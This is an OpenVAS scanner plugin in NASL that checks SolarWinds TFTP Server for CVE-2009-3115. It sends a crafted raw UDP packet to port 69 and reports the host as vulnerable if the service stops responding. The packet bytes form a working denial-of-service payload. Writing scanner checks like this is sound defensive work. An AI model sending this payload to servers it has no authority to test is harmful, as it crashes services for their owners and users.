###############################################################################
# OpenVAS Vulnerability Test
# $Id: SolarWinds_TFTP.nasl 5220 2017-02-07 11:42:33Z teissa $
#
# SolarWinds TFTP Server Option Acknowledgement Request Denial Of Service Vulnerability
#
# Authors:
# Michael Meyer
#
# Copyright:
# Copyright (c) 2009 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if (description)
{
 script_oid("1.3.6.1.4.1.25623.1.0.100264");
 script_version("$Revision: 5220 $");
 script_tag(name:"last_modification", value:"$Date: 2017-02-07 12:42:33 +0100 (Tue, 07 Feb 2017) $");
 script_tag(name:"creation_date", value:"2009-08-31 17:18:15 +0200 (Mon, 31 Aug 2009)");
 script_tag(name:"cvss_base", value:"5.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
 script_cve_id("CVE-2009-3115");
 script_bugtraq_id(36182);

 script_name("SolarWinds TFTP Server Option Acknowledgement Request Denial Of Service Vulnerability");

 script_category(ACT_DENIAL);
 script_family("Denial of Service");
 script_copyright("This script is Copyright (C) 2009 Greenbone Networks GmbH");
 script_dependencies("tftpd_detect.nasl");
 script_require_udp_ports("Services/udp/tftp", 69);

 script_tag(name : "summary" , value : "SolarWinds TFTP Server is prone to a denial-of-service vulnerability.");
 script_tag(name : "impact" , value : "A successful exploit may allow attackers to crash the server process,
 resulting in a denial-of-service condition.");
 script_tag(name : "affected" , value : "SolarWinds TFTP Server 9.2.0.111 and prior versions are vulnerable.");

 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/36182");
 script_xref(name : "URL" , value : "http://solarwinds.net/Tools/Free_tools/TFTP_Server/index.htm");

 script_tag(name:"qod_type", value:"exploit");

 exit(0);
}

include("tftp.inc");

if(safe_checks())exit(0);

port = get_kb_item('Services/udp/tftp');
if (! port) port = 69;
if (get_kb_item('tftp/'+port+'/backdoor')) exit(0);

if ( tftp_alive(port: port) ) {

 boom = raw_string(0x00,0x06,0x54,0x9d,0x68,0x21,0xde,
 		   0x59,0x30,0x9a,0x0b,0xb5,0xd4,0x94,
 		   0x94,0x42,0x3c,0xeb,0xc5,0xc1,0xe8,
		   0x7d,0x31,0x34,0xee,0xd8,0x60,0x41,
		   0x8f,0x92,0x25,0x9c,0x5c,0xcc,0x78,
		   0x6a);

 soc = open_sock_udp(port);
 send(socket:soc, data:boom);
 close(soc);

 if(!tftp_alive(port: port)) {
  security_message(port:port,proto:"udp");
  exit(0);
 }
}

exit(99);
